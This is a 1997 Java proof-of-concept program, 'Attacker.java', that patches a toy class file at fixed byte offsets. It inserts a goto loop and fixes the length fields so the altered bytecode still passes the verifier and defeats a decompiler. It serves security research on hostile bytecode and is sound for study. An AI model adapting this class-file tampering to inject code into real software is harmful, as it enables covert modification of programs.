package hostile;
/* Attacker.java by Mark D. LaDue */

/* February 14, 1997 */

/* Copyright (c) 1997 Mark D. LaDue
   You may study, use, modify, and distribute this example for any purpose.
   This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java application was designed to attack a specific class file,
   Beginner.class.  The program Beginner.java is simply this:

   import java.io.*;

   class Beginner {
       public static void main(String[] argv) {
           try {
               FileInputStream inner = new FileInputStream("none");
           }
           catch (IOException ioe) {System.out.println("Oops!");}
           finally {System.out.println("Whew!");}
       }
   }

   Beginner.java tries to read a nonexistent file, catches the resulting
   IOException and prints an error message, and finally prints one last
   message.  Attacker.java inserts 3 bytes of code into Beginner.class at the
   end of its finally block: goto followed by the 2-byte offset necessary to
   return control to the beginning of the program. Attacker also adjusts the
   attribute_length and code_length of the proper Code_attribute structure to
   maintain verifiability. The altered Beginner.class readily passes the
   Verifier, and when run, it proceeds into an infinite loop of printing
   "Oops!" and "Help!" messages, as expected. This deviant class file could not
   have been produced by a Java compiler, and the Mocha decompiler fails to
   decompile it.  This illustrates the ease with which Java class files can be
   attacked.  It also shows how easy it is to create deviant class files.
   See the paper, "When Java Was One:  Threats from Hostile Byte Code and Java
   Platform Viruses" for more thoughts on the subject.  */

import java.io.*;

class Attacker {
    public static void main(String[] argv) {

        String victim = "Beginner"; // What's the name of the target?
        int fpointer = 0; // Where are we in the target class file?

// How on earth do I use this thing?
        if (argv.length != 0) {
            System.out.println("Try \"java Attacker" + "\".");
            System.exit(1);
        }

// If the target isn't writeable, then forget the whole deal.
        File testit = new File(victim + ".class");
        if (!(testit.canWrite())) {
            System.out.println(victim + ".class must be writeable.  Fix it!");
            System.exit(2);
        }
        try {
            RandomAccessFile target = new RandomAccessFile(victim + ".class",
                                                           "rw");

/* Adjust the proper attribute_length and code_length in order to maintain
   the hacked class file's verifiability. */

// Increase the attacked method's attribute_lenth by 3.
        fpointer = 455;
        target.seek(fpointer);
        int changed_byte = (int)target.readUnsignedByte() + 3;
        target.seek(fpointer);
        target.writeByte(changed_byte);

// Increase the attacked method's code_length by 3.
        fpointer = 463;
        target.seek(fpointer);
        changed_byte = (int)target.readUnsignedByte() + 3;
        target.seek(fpointer);
        target.writeByte(changed_byte);

/* Insert the 3 bytes of code to make Beginner.class deviant */

// Get to where we want to insert code.
        fpointer = 506;
        target.seek(fpointer);

// Save the remainder of the target class file.
        int diff = (int)target.length() - fpointer;
        byte[] tail = new byte[diff];
        target.read(tail, 0, diff);

// Insert the 3 bytes.
        target.seek(fpointer);
        target.writeByte(167);
        target.writeByte(255);
        target.writeByte(214);

// Restore the tail.
        target.write(tail);

// All the changes are made, so close the file and get out of here 
        target.close();
        } catch (IOException ioe) {}
    }
}
